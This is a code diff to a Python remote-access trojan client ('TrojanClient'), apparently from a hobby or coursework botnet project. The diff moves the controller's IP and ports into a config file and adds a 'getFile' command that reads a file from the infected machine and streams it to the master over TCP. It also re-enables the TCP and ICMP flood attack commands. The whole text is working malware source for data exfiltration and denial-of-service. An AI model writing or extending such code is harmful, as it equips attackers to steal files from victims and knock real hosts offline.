@@ -1,3 +1,4 @@
+import configparser
 import json
 import os
 import socket
@@ -24,7 +25,10 @@ import time
 from queue import Queue
 from threading import Thread
 
-master_ip = '100.95.220.133'
+config = configparser.ConfigParser()
+config.read('config.ini', 'utf8')
+
+master_ip = config.get('client', 'masterIp')
 
 
 def restart_program():
@@ -77,8 +81,8 @@ class TrojanClient:
         self.udpPort = udpPort
         self.udpRecvPort = udpPort + 1
         self.masterIP = master_ip
-        self.masterUdpPort = 8083
-        self.masterTcpPort = 8877
+        self.masterUdpPort = config.getint('client', 'masterUdpPort')
+        self.masterTcpPort = config.getint('client', 'masterTcpPort')
         self.ownip = get_host_ip()
         print(self.ownip)
         self.cwd = os.getcwd()
@@ -165,6 +169,16 @@ class TrojanClient:
                 elif cmd == "filelist":
                     self.tcpSocket.send(struct.pack('i', len(data)))
                     self.tcpPieceSend(data, self.tcpSocket, 1024)
+
+                elif cmd == "file":
+                    length = os.path.getsize(data)
+                    self.tcpSocket.send(struct.pack('i', length))
+                    with open(data, 'rb') as file:
+                        while True:
+                            d = file.read(1024)
+                            if not d:
+                                break
+                            self.tcpPieceSend(d, self.tcpSocket, 1024)
             except:
                 print("控制端断开")
 
@@ -231,8 +245,10 @@ class TrojanClient:
                     self.tcpSocket = None
             elif cmd == 'tcpFlood':
                 # dst_ip  port start end
+                self.attacker.enableStop = False
                 self.attacker.allFlood(*allcmd[1:])
             elif cmd == 'icmpFlood':
+                self.attacker.enableStop = False
                 self.attacker.icmpAttack(allcmd[1])
             elif cmd == 'floodStop':
                 self.attacker.enableStop = True
@@ -257,6 +273,10 @@ class TrojanClient:
                 size = int(allcmd[2])
                 print(filename)
                 self.saveFiles(self.tcpSocket, filename, size)
+            elif cmd == 'getFile':
+                filename = allcmd[1]
+                full = os.path.join(os.getcwd(), filename)
+                self.tcpSend("file", full)
             elif cmd == "update":
                 try:
                     if self.tcpSocket:
